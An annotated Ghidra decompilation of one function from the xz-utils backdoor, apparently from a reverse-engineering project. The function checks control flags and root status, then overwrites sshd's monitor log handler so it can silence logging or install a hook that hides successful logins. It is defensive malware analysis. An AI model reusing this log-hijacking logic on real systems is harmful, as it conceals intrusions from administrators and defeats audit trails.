// /home/kali/xzre-ghidra/xzregh/107DE0_sshd_install_mm_log_handler_hook.c
// Function: sshd_install_mm_log_handler_hook @ 0x107DE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_install_mm_log_handler_hook(cmd_arguments_t * cmd_flags, global_context_t * ctx)


/*
 * AutoDoc: Validates that the caller provided writable log handler slots plus the format strings needed to rewrite messages, and
 * only honours logging requests when the controlling flag (bit 3 in `cmd_flags->flags1`) is set or the backdoor is already
 * running as root. If the existing handler/context pointers already reside inside sshd it swaps them so the implant can
 * hijack them safely, snapshots the original function/context, and either disables logging entirely or enables filtering
 * mode. In filter mode it verifies that the `%s`, `"Connection closed by"`, and `"(preauth)"` strings are available before
 * dropping `mm_log_handler_hide_auth_success_hook` into place.
 */

#include "xzre_types.h"

BOOL sshd_install_mm_log_handler_hook(cmd_arguments_t *cmd_flags,global_context_t *ctx)

{
  byte control_flags;
  sshd_log_ctx_t *log_ctx;
  void **handler_ctx_slot;
  void *saved_ctx_value;
  void **active_ctx_slot;
  log_handler_fn *log_handler_slot;
  byte log_flag;
  
  log_ctx = ctx->sshd_log_ctx;
  // AutoDoc: Bail unless the log context, handler slot, ctx slot, and hook entry were all recovered.
  if (((((cmd_flags == (cmd_arguments_t *)0x0) || (log_ctx == (sshd_log_ctx_t *)0x0)) ||
       (log_handler_slot = log_ctx->log_handler_slot, log_handler_slot == (log_handler_fn *)0x0)) ||
      ((handler_ctx_slot = (log_handler_fn *)log_ctx->log_handler_ctx_slot, handler_ctx_slot == (log_handler_fn *)0x0
       || (log_ctx->log_hook_entry == (mm_log_handler_fn)0x0)))) ||
     (log_ctx->handler_slots_valid == FALSE)) {
    return FALSE;
  }
  control_flags = cmd_flags->control_flags;
  log_flag = control_flags & 8;
  // AutoDoc: Only rewire logging when the control bit requested it or the implant is already running as root.
  if ((log_flag == 0) || (ctx->caller_uid == 0)) {
    saved_ctx_value = *handler_ctx_slot;
    active_ctx_slot = handler_ctx_slot;
    // AutoDoc: Swap the handler/context slots when the saved pointer already lives inside sshd so patching stays safe.
    if ((saved_ctx_value != (log_handler_fn)0x0) &&
       ((ctx->sshd_text_start <= saved_ctx_value && (saved_ctx_value < ctx->sshd_text_end)))) {
      log_ctx->log_handler_slot = handler_ctx_slot;
      log_ctx->log_handler_ctx_slot = log_handler_slot;
      active_ctx_slot = log_handler_slot;
      log_handler_slot = handler_ctx_slot;
    }
    saved_ctx_value = *active_ctx_slot;
    log_ctx->saved_log_handler = *log_handler_slot;
    log_ctx->saved_log_handler_ctx = saved_ctx_value;
    if (log_flag == 0) {
      log_ctx->log_squelched = TRUE;
    }
    else if ((control_flags & 0x10) != 0) {
      // AutoDoc: Filter mode requires the `%s`, `Connection closed by`, and `(preauth)` strings; missing any of them aborts.
      if (log_ctx->fmt_percent_s == (char *)0x0) {
        return FALSE;
      }
      if (log_ctx->str_connection_closed_by == (char *)0x0) {
        return FALSE;
      }
      if (log_ctx->str_preauth == (char *)0x0) {
        return FALSE;
      }
    }
    // AutoDoc: Whichever slot currently holds the log handler pointer is overwritten with `mm_log_handler_hide_auth_success_hook`.
    *log_handler_slot = (log_handler_fn)log_ctx->log_hook_entry;
  }
  return TRUE;
}

